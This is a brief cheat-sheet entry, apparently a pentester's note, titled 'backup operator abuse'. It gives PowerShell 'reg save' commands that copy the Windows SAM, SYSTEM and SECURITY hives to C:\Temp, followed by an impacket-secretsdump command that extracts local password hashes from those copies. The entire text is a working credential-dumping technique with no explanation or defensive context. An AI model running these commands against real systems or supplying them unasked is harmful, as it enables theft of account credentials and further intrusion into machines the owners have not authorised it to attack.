backup operator abuse:
```powershell
reg save hklm\sam c:\Temp\sam.sav
reg save hklm\system c:\Temp\system.sav

reg save hklm\security c:\Temp\security.sav


#crack it with secretdump:
impacket-secretsdump LOCAL -system system.sav -sam sam.sav
```